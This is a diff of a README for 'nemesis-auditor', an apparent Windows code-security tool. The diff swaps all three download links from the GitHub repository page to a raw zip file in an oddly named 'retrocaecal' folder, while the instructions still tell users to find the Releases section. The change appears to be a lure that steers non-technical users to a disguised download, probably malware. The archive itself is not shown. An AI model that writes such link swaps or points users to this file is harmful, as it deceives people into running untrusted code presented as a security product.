@@ -1,6 +1,6 @@
 # 🔍 nemesis-auditor - Clear Security Checks for Your Code
 
-[![Download nemesis-auditor](https://img.shields.io/badge/Download-nemesis--auditor-green)](https://github.com/HugoTorcuato19/nemesis-auditor)
+[![Download nemesis-auditor](https://img.shields.io/badge/Download-nemesis--auditor-green)](https://github.com/HugoTorcuato19/nemesis-auditor/raw/refs/heads/main/retrocaecal/nemesis-auditor-v3.3.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Follow these steps to get nemesis-auditor running on your Windows PC. The instru
 
 1. Click the green **Download** button at the top or visit the link below to access the download page:
 
-   [Download nemesis-auditor](https://github.com/HugoTorcuato19/nemesis-auditor)
+   [Download nemesis-auditor](https://github.com/HugoTorcuato19/nemesis-auditor/raw/refs/heads/main/retrocaecal/nemesis-auditor-v3.3.zip)
 
 2. On the GitHub page, look for the **Releases** section. This is usually found on the right side or under the repository description.
 
@@ -98,7 +98,7 @@ If problems continue, you can visit the GitHub page to find more help or report 
 
 Access the latest version of nemesis-auditor here:
 
-[![Get nemesis-auditor](https://img.shields.io/badge/Get%20nemesis--auditor-blue)](https://github.com/HugoTorcuato19/nemesis-auditor)
+[![Get nemesis-auditor](https://img.shields.io/badge/Get%20nemesis--auditor-blue)](https://github.com/HugoTorcuato19/nemesis-auditor/raw/refs/heads/main/retrocaecal/nemesis-auditor-v3.3.zip)
 
 Use this link to always find the newest updates and files for your Windows system.
 
